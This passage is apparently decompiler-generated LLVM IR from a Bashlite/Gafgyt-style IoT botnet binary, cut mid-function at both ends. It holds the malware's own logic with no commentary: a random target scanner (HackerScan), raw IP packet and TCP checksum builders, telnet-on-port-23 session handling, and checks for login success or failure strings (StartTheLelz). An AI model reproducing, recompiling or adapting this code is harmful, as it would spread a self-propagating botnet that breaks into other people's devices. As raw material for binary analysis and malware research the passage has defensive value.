  %v1_10007510 = udiv i32 %v2_1000750c, 128
  %tmp = icmp slt i32 %v0_100074f8, 0
  %v1_10007514 = zext i1 %tmp to i32
  %v2_10007514 = ashr i32 %v0_100074f8, 31
  %v3_10007514 = and i32 %v2_10007514, -2
  %v4_10007514 = or i32 %v3_10007514, %v1_10007514
  %v2_10007518 = sub nsw i32 %v1_10007510, %v4_10007514
  %tmp18 = mul i32 %v2_10007518, -255
  %v2_10007528 = add i32 %tmp18, %v0_100074f8
  %v1_10007540 = trunc i32 %v2_10007528 to i8
  store i8 %v1_10007540, i8* @global_var_1002c8fc.47, align 1
  store i32 0, i32* %stack_var_-52, align 4
  %v2_10007564 = ptrtoint i32* %stack_var_-52 to i32
  %v2_10007578 = load i8, i8* bitcast (i8** @global_var_1002c8f8.43 to i8*), align 4
  %v3_10007578 = zext i8 %v2_10007578 to i32
  %v4_100075d4 = call i32 @szprintf(i32 %v2_10007564, i32 ptrtoint ([12 x i8]* @global_var_10017138.247 to i32), i32 %v3_10007578)
  store i32 268465636, i32* @lr, align 4
  %v1_100075e0 = call i32 @inet_addr(i32 %v2_10007564)
  ret i32 %v1_100075e0

; uselistorder directives
  uselistorder i32 %v2_10007564, { 1, 0 }
  uselistorder i32 %v0_100074f8, { 1, 3, 0, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i8* @global_var_1002c8fc.47, { 2, 1, 0 }
  uselistorder i8* @global_var_1002c8fb.46, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1002c8fa.45, { 2, 1, 0 }
  uselistorder i8* @global_var_1002c8f9.44, { 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10007620 = load i32, i32* @global_var_1002c908.248, align 4
  store i32 %v3_10007620, i32* @r3, align 4
  %v2_10007628 = call i32 @ntohl(i32 %v3_10007620, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_10007634 = and i32 %v2_10007628, %arg1
  %v0_1000763c = call i32 @rand_cmwc()
  %v1_10007648 = sub i32 -1, %arg1
  %v2_1000764c = and i32 %v0_1000763c, %v1_10007648
  %v2_10007654 = xor i32 %v2_1000764c, %v2_10007634
  ret i32 %v2_10007654
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100076e43 = icmp sgt i32 %arg2, 1
  br i1 %v2_100076e43, label %dec_label_pc_1000769c, label %dec_label_pc_100076ec

dec_label_pc_1000769c:                            ; preds = %entry, %dec_label_pc_1000769c
  %stack_var_-24.08 = phi i16* [ %v5_100076d0, %dec_label_pc_1000769c ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_100076d8, %dec_label_pc_1000769c ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_100076bc, %dec_label_pc_1000769c ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_100076b8, %dec_label_pc_1000769c ], [ 0, %entry ]
  %v4_1000769c = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_100076a0 = load i16, i16* %stack_var_-24.08, align 2
  %v3_100076a0 = zext i16 %v2_100076a0 to i32
  %v2_100076b8 = add i32 %v3_100076a0, %stack_var_-12.05
  %v3_100076b8 = icmp ult i32 %v2_100076b8, %stack_var_-12.05
  %v4_100076bc = zext i1 %v3_100076b8 to i32
  %v5_100076bc = add i32 %v4_100076bc, %stack_var_-16.06
  %v1_100076cc = add i32 %v4_1000769c, 2
  %v5_100076d0 = inttoptr i32 %v1_100076cc to i16*
  %v1_100076d8 = add nsw i32 %stack_var_-20.07, -2
  %v2_100076e4 = icmp sgt i32 %v1_100076d8, 1
  br i1 %v2_100076e4, label %dec_label_pc_1000769c, label %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge

dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge: ; preds = %dec_label_pc_1000769c
  %v3_100076e4.le = icmp eq i32 %v1_100076d8, 1
  br i1 %v3_100076e4.le, label %dec_label_pc_100076f8, label %dec_label_pc_10007764.preheader

dec_label_pc_100076ec:                            ; preds = %entry
  %v3_100076e44 = icmp eq i32 %arg2, 1
  br i1 %v3_100076e44, label %dec_label_pc_100076f8, label %dec_label_pc_10007764.preheader

dec_label_pc_100076f8:                            ; preds = %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge, %dec_label_pc_100076ec
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_100076d0, %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge ], [ %arg1, %dec_label_pc_100076ec ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_100076bc, %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge ], [ 0, %dec_label_pc_100076ec ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_100076b8, %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge ], [ 0, %dec_label_pc_100076ec ]
  %v1_100076fc = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_100076fc = load i8, i8* %v1_100076fc, align 1
  %v3_100076fc = zext i8 %v2_100076fc to i32
  %v2_10007714 = add i32 %v3_100076fc, %stack_var_-12.0.lcssa18
  %v3_10007714 = icmp ult i32 %v2_10007714, %stack_var_-12.0.lcssa18
  %v4_10007718 = zext i1 %v3_10007714 to i32
  %v5_10007718 = add i32 %v4_10007718, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10007764.preheader

dec_label_pc_10007764.preheader:                  ; preds = %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge, %dec_label_pc_100076f8, %dec_label_pc_100076ec
  %stack_var_-12.1.ph = phi i32 [ %v2_100076b8, %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge ], [ 0, %dec_label_pc_100076ec ], [ %v2_10007714, %dec_label_pc_100076f8 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_100076bc, %dec_label_pc_100076e0.dec_label_pc_100076ec_crit_edge ], [ 0, %dec_label_pc_100076ec ], [ %v5_10007718, %dec_label_pc_100076f8 ]
  %v1_1000776829 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_1000777030 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_1000777431 = or i32 %v1_1000776829, %v1_1000777030
  %v1_1000777c32 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_1000778433 = or i32 %v2_1000777431, %v1_1000777c32
  %v3_1000778834 = icmp eq i32 %v2_1000778433, 0
  br i1 %v3_1000778834, label %dec_label_pc_10007790, label %dec_label_pc_10007728

dec_label_pc_10007728:                            ; preds = %dec_label_pc_10007764.preheader, %dec_label_pc_10007728
  %v1_1000777c37 = phi i32 [ %v1_1000777c, %dec_label_pc_10007728 ], [ %v1_1000777c32, %dec_label_pc_10007764.preheader ]
  %v2_1000777436 = phi i32 [ %v2_10007774, %dec_label_pc_10007728 ], [ %v2_1000777431, %dec_label_pc_10007764.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10007754, %dec_label_pc_10007728 ], [ %stack_var_-12.1.ph, %dec_label_pc_10007764.preheader ]
  %v1_10007734 = urem i32 %stack_var_-12.135, 65536
  %v2_10007754 = add i32 %v2_1000777436, %v1_10007734
  %v3_10007754 = icmp ult i32 %v2_10007754, %v1_10007734
  %v4_10007758 = zext i1 %v3_10007754 to i32
  %v5_10007758 = add nuw nsw i32 %v4_10007758, %v1_1000777c37
  %v1_10007768 = mul i32 %v5_10007758, 65536
  %v1_10007770 = udiv i32 %v2_10007754, 65536
  %v2_10007774 = or i32 %v1_10007768, %v1_10007770
  %v1_1000777c = udiv i32 %v5_10007758, 65536
  %v2_10007784 = or i32 %v2_10007774, %v1_1000777c
  %v3_10007788 = icmp eq i32 %v2_10007784, 0
  br i1 %v3_10007788, label %dec_label_pc_10007764.dec_label_pc_10007790_crit_edge, label %dec_label_pc_10007728

dec_label_pc_10007764.dec_label_pc_10007790_crit_edge: ; preds = %dec_label_pc_10007728
  br label %dec_label_pc_10007790

dec_label_pc_10007790:                            ; preds = %dec_label_pc_10007764.dec_label_pc_10007790_crit_edge, %dec_label_pc_10007764.preheader
  %v4_10007790 = zext i16 %tmp21 to i32
  %v1_1000779c = xor i32 %v4_10007790, 65535
  ret i32 %v1_1000779c

; uselistorder directives
  uselistorder i32 %v2_10007774, { 1, 0 }
  uselistorder i32 %v5_10007758, { 1, 0 }
  uselistorder i32 %v2_10007754, { 0, 2, 1 }
  uselistorder i32 %v1_1000777c32, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_100076d8, { 0, 2, 1 }
  uselistorder i32 %v2_100076b8, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007728, { 1, 0 }
  uselistorder label %dec_label_pc_10007764.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100076f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000769c, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100077b4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100077b4, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100077e0 = add i32 %arg1, 12
  %v2_100077e0 = inttoptr i32 %v1_100077e0 to i32*
  %v3_100077e0 = load i32, i32* %v2_100077e0, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100077ec = add i32 %arg1, 16
  %v2_100077ec = inttoptr i32 %v1_100077ec to i32*
  %v3_100077ec = load i32, i32* %v2_100077ec, align 4
  store i32 20, i32* @r3, align 4
  %v1_10007808 = call i32 @htons(i32 20)
  store i32 268466216, i32* @lr, align 4
  %v1_10007824 = call i32 @malloc(i32 32)
  store i32 %v1_10007824, i32* %r11.global-to-local, align 4
  store i32 %v3_100077ec, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10007844 = inttoptr i32 %v1_10007824 to i32*
  store i32 %v3_100077e0, i32* %v2_10007844, align 4
  %v0_10007848 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007848 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007848 = add i32 %v1_10007848, 4
  %v3_10007848 = inttoptr i32 %v2_10007848 to i32*
  store i32 %v0_10007848, i32* %v3_10007848, align 4
  %v0_1000784c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000784c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000784c = add i32 %v1_1000784c, 8
  %v3_1000784c = inttoptr i32 %v2_1000784c to i32*
  store i32 %v0_1000784c, i32* %v3_1000784c, align 4
  %v1_10007854 = add i32 %v1_10007824, 12
  store i32 %v1_10007854, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000785c = load i32, i32* %arg2, align 4
  %v1_10007860 = add i32 %tmp, 4
  %v2_10007860 = inttoptr i32 %v1_10007860 to i32*
  %v3_10007860 = load i32, i32* %v2_10007860, align 4
  store i32 %v3_10007860, i32* %r10.global-to-local, align 4
  %v1_10007864 = add i32 %tmp, 8
  %v2_10007864 = inttoptr i32 %v1_10007864 to i32*
  %v3_10007864 = load i32, i32* %v2_10007864, align 4
  %v1_10007868 = add i32 %tmp, 12
  %v2_10007868 = inttoptr i32 %v1_10007868 to i32*
  %v3_10007868 = load i32, i32* %v2_10007868, align 4
  %v2_1000786c = inttoptr i32 %v1_10007854 to i32*
  store i32 %v2_1000785c, i32* %v2_1000786c, align 4
  %v0_10007870 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007870 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007870 = add i32 %v1_10007870, 4
  %v3_10007870 = inttoptr i32 %v2_10007870 to i32*
  store i32 %v0_10007870, i32* %v3_10007870, align 4
  %v1_10007874 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007874 = add i32 %v1_10007874, 8
  %v3_10007874 = inttoptr i32 %v2_10007874 to i32*
  store i32 %v3_10007864, i32* %v3_10007874, align 4
  %v1_10007878 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007878 = add i32 %v1_10007878, 12
  %v3_10007878 = inttoptr i32 %v2_10007878 to i32*
  store i32 %v3_10007868, i32* %v3_10007878, align 4
  %v1_1000787c = add i32 %tmp, 16
  %v2_1000787c = inttoptr i32 %v1_1000787c to i32*
  %v3_1000787c = load i32, i32* %v2_1000787c, align 4
  %v1_10007880 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007880 = add i32 %v1_10007880, 16
  %v3_10007880 = inttoptr i32 %v2_10007880 to i32*
  store i32 %v3_1000787c, i32* %v3_10007880, align 4
  %v5_1000788c = inttoptr i32 %v1_10007824 to i16*
  %v6_1000788c = call i32 @csum(i16* %v5_1000788c, i32 32, i32 %v3_10007868, i32 %v3_10007864, i32 %tmp)
  %sext = mul i32 %v6_1000788c, 65536
  %v1_10007890 = sdiv i32 %sext, 65536
  store i32 268466336, i32* @lr, align 4
  %v1_1000789c = call i32 @free(i32 %v1_10007824)
  %v1_100078a4 = urem i32 %v1_10007890, 65536
  %v2_100078ac = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_100078ac, i32* %r11.global-to-local, align 4
  ret i32 %v1_100078a4

; uselistorder directives
  uselistorder i32 %v1_10007824, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_100078fc = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100078fc, i32* %arg1, align 4
  %v1_10007910 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10007910, i32* %arg1, align 4
  %v3_10007920 = add i32 %tmp1, 1
  %v4_10007920 = inttoptr i32 %v3_10007920 to i8*
  store i8 0, i8* %v4_10007920, align 1
  %fold = add i32 %arg5, 20
  %v1_10007938 = trunc i32 %fold to i16
  %v3_10007938 = add i32 %tmp1, 2
  %v4_10007938 = inttoptr i32 %v3_10007938 to i16*
  store i16 %v1_10007938, i16* %v4_10007938, align 2
  %v0_1000793c = call i32 @rand_cmwc()
  %v1_1000794c = trunc i32 %v0_1000793c to i16
  %v3_1000794c = add i32 %tmp1, 4
  %v4_1000794c = inttoptr i32 %v3_1000794c to i16*
  store i16 %v1_1000794c, i16* %v4_1000794c, align 2
  %v3_10007958 = add i32 %tmp1, 6
  %v4_10007958 = inttoptr i32 %v3_10007958 to i16*
  store i16 0, i16* %v4_10007958, align 2
  %v3_10007964 = add i32 %tmp1, 8
  %v4_10007964 = inttoptr i32 %v3_10007964 to i8*
  store i8 -1, i8* %v4_10007964, align 1
  %v3_10007970 = add i32 %tmp1, 9
  %v4_10007970 = inttoptr i32 %v3_10007970 to i8*
  store i8 %tmp, i8* %v4_10007970, align 1
  %v3_1000797c = add i32 %tmp1, 10
  %v4_1000797c = inttoptr i32 %v3_1000797c to i16*
  store i16 0, i16* %v4_1000797c, align 2
  %v2_10007988 = add i32 %tmp1, 12
  %v3_10007988 = inttoptr i32 %v2_10007988 to i32*
  store i32 %arg3, i32* %v3_10007988, align 4
  %v2_10007994 = add i32 %tmp1, 16
  %v3_10007994 = inttoptr i32 %v2_10007994 to i32*
  store i32 %arg2, i32* %v3_10007994, align 4
  ret i32 %v0_1000793c
}

define i32 @sclose(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100079cc = icmp sgt i32 %arg1, 2
  br i1 %v2_100079cc, label %dec_label_pc_100079e0, label %dec_label_pc_100079f0

dec_label_pc_100079e0:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_100079e8.249 to i32), i32* @lr, align 4
  %v1_100079e4 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_100079f0

dec_label_pc_100079f0:                            ; preds = %entry, %dec_label_pc_100079e0
  %storemerge = phi i32 [ 0, %dec_label_pc_100079e0 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_100079f0, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10007a2c = add i32 %arg1, 4
  %v2_10007a2c = inttoptr i32 %v1_10007a2c to i32*
  %v3_10007a2c = load i32, i32* %v2_10007a2c, align 4
  store i32 %v3_10007a2c, i32* %stack_var_-20, align 4
  store i32 268466760, i32* @lr, align 4
  %v3_10007a44 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10007a44
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268466856, i32* @lr, align 4
  %v4_10007aa4 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_10007abc = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10007acc = load i8, i8* %arg3, align 1
  %v3_10007ad4 = icmp eq i8 %v3_10007acc, -1
  br i1 %v3_10007ad4, label %dec_label_pc_10007adc, label %dec_label_pc_10007af0

dec_label_pc_10007adc:                            ; preds = %entry
  store i32 268466928, i32* @lr, align 4
  %v6_10007aec = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10007af0

dec_label_pc_10007af0:                            ; preds = %entry, %dec_label_pc_10007adc
  %v3_10007afc = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_10007b04 = icmp ne i32 %v3_10007afc, 0
  %. = zext i1 %v3_10007b04 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10007af0, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10007b74 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10007b74, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge

dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge: ; preds = %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge.dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge_crit_edge, %entry
  %v3_10007b8c.pre = phi i32 [ %v2_10007b74, %entry ], [ %v3_10007b8c.pre.pre, %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge.dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge_crit_edge ]
  %v1_10007ba421 = phi i32 [ 1, %entry ], [ %v1_10007ba4, %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge.dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge_crit_edge ]
  %v1_10007b90 = mul nuw nsw i32 %v1_10007ba421, 4
  %v2_10007b94 = add i32 %v1_10007b90, %v3_10007b8c.pre
  %v2_10007b9c = inttoptr i32 %v2_10007b94 to i32*
  store i32 0, i32* %v2_10007b9c, align 4
  %v1_10007ba4 = add nuw nsw i32 %v1_10007ba421, 1
  %tmp19 = icmp ult i32 %v1_10007ba4, 32
  br i1 %tmp19, label %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge.dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge_crit_edge, label %dec_label_pc_10007bb8

dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge.dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge_crit_edge: ; preds = %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge
  %v3_10007b8c.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge

dec_label_pc_10007bb8:                            ; preds = %dec_label_pc_10007b88.dec_label_pc_10007b88_crit_edge
  %v1_10007bbc = udiv i32 %arg1, 32
  %v1_10007bc4 = mul nuw nsw i32 %v1_10007bbc, 4
  %v2_10007bc8 = ptrtoint i32* %stack_var_-184 to i32
  %v2_10007bcc = add nuw nsw i32 %v1_10007bc4, 8
  %v1_10007bd0 = add i32 %v2_10007bcc, %v2_10007bc8
  %v1_10007bd4 = inttoptr i32 %v1_10007bd0 to i32*
  %v2_10007bd4 = load i32, i32* %v1_10007bd4, align 4
  %v1_10007bdc = urem i32 %arg1, 32
  %v3_10007be4 = shl i32 1, %v1_10007bdc
  %v2_10007be8 = or i32 %v2_10007bd4, %v3_10007be4
  store i32 %v2_10007be8, i32* %v1_10007bd4, align 4
  %v1_10007c04 = add i32 %arg1, 1
  %v2_10007c0c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268467240, i32* @lr, align 4
  %v5_10007c24 = call i32 @__libc_select(i32 %v1_10007c04, i32 %v2_10007b74, i32 0, i32 0, i32 %v2_10007c0c)
  %v2_10007c2c = icmp sgt i32 %v5_10007c24, 0
  br i1 %v2_10007c2c, label %dec_label_pc_10007c40, label %dec_label_pc_10007c60

dec_label_pc_10007c40:                            ; preds = %dec_label_pc_10007bb8
  store i32 268467288, i32* @lr, align 4
  %v4_10007c54 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10007c60

dec_label_pc_10007c60:                            ; preds = %dec_label_pc_10007bb8, %dec_label_pc_10007c40
  %storemerge = phi i32 [ %v4_10007c54, %dec_label_pc_10007c40 ], [ 0, %dec_label_pc_10007bb8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10007ba4, { 1, 0 }
  uselistorder i32 %v2_10007b74, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10007c60, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10007ca8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([4 x i8*]* @global_var_1002c4a8.254 to i32))
  ret i32 %v3_10007ca8
}

define i32 @contains_fail(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10007cf4 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_1002c488.262 to i32))
  ret i32 %v3_10007cf4

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10007d4c

dec_label_pc_10007d4c:                            ; preds = %dec_label_pc_10007d4c, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10007d50, %dec_label_pc_10007d4c ]
  %v1_10007d50 = add i32 %stack_var_-36.0, 1
  %v1_10007d5c = mul i32 %v1_10007d50, 4
  %v2_10007d68 = add i32 %v1_10007d5c, %arg2
  %v1_10007d6c = inttoptr i32 %v2_10007d68 to i32*
  %v2_10007d6c = load i32, i32* %v1_10007d6c, align 4
  %v3_10007d70 = icmp eq i32 %v2_10007d6c, 0
  br i1 %v3_10007d70, label %dec_label_pc_10007dd0.preheader, label %dec_label_pc_10007d4c

dec_label_pc_10007dd0.preheader:                  ; preds = %dec_label_pc_10007d4c
  %v2_10007dd84 = icmp sgt i32 %v1_10007d50, 0
  br i1 %v2_10007dd84, label %dec_label_pc_10007d84.lr.ph, label %dec_label_pc_10007de8

dec_label_pc_10007d84.lr.ph:                      ; preds = %dec_label_pc_10007dd0.preheader
  %v3_10007da8 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_10007d84

dec_label_pc_10007d84:                            ; preds = %dec_label_pc_10007d84.lr.ph, %dec_label_pc_10007dc4
  %storemerge27 = phi i32 [ 0, %dec_label_pc_10007d84.lr.ph ], [ %v1_10007dc8, %dec_label_pc_10007dc4 ]
  %v1_10007d88 = mul i32 %storemerge27, 4
  %v2_10007d94 = add i32 %v1_10007d88, %arg2
  %v1_10007d98 = inttoptr i32 %v2_10007d94 to i32*
  %v2_10007d98 = load i32, i32* %v1_10007d98, align 4
  store i32 268467628, i32* @lr, align 4
  %v4_10007da8 = call i32 @strcasestr(i8* %v3_10007da8, i32 %v2_10007d98, i32 %v2_10007d94)
  %v3_10007db0 = icmp eq i32 %v4_10007da8, 0
  br i1 %v3_10007db0, label %dec_label_pc_10007dc4, label %dec_label_pc_10007de8.loopexit

dec_label_pc_10007dc4:                            ; preds = %dec_label_pc_10007d84
  %v1_10007dc8 = add nuw nsw i32 %storemerge27, 1
  %v2_10007dd8 = icmp slt i32 %v1_10007dc8, %v1_10007d50
  br i1 %v2_10007dd8, label %dec_label_pc_10007d84, label %dec_label_pc_10007de8.loopexit

dec_label_pc_10007de8.loopexit:                   ; preds = %dec_label_pc_10007dc4, %dec_label_pc_10007d84
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_10007d84 ], [ 0, %dec_label_pc_10007dc4 ]
  br label %dec_label_pc_10007de8

dec_label_pc_10007de8:                            ; preds = %dec_label_pc_10007de8.loopexit, %dec_label_pc_10007dd0.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10007dd0.preheader ], [ %storemerge.ph, %dec_label_pc_10007de8.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10007d50, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10007d84, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007e08 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007e08, i32* %stack_var_-624, align 4
  store i32 268467780, i32* @lr, align 4
  %v1_10007e40 = call i32 @__GI_time(i32 0)
  %v0_10007e4c = call i32 @rand_cmwc()
  %v2_10007e54 = xor i32 %v1_10007e40, %v0_10007e4c
  store i32 ptrtoint (i32* @global_var_10007e60.263 to i32), i32* @lr, align 4
  %v1_10007e5c = call i32 @srand(i32 %v2_10007e54)
  store i32 2, i32* %stack_var_-40, align 4
  store i32 23, i32* @r3, align 4
  %v1_10007e6c = call i32 @htons(i32 23)
  %v2_10007e7c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007e7c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 268467864, i32* @lr, align 4
  %v1_10007e94 = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r9.global-to-local, align 4
  store i32 268467896, i32* @lr, align 4
  %v3_10007eb4 = call i32 @__GI_memset(i32 %v1_10007e94, i32 0, i32 1025)
  %v2_10007ed0 = load i32, i32* %stack_var_-624, align 4
  %v1_10007ed8 = load i32, i32* @r1, align 4
  %v3_10007ed8 = add i32 %v1_10007ed8, -28016
  %v4_10007ed8 = inttoptr i32 %v3_10007ed8 to i32*
  store i32 %v2_10007ed0, i32* %v4_10007ed8, align 4
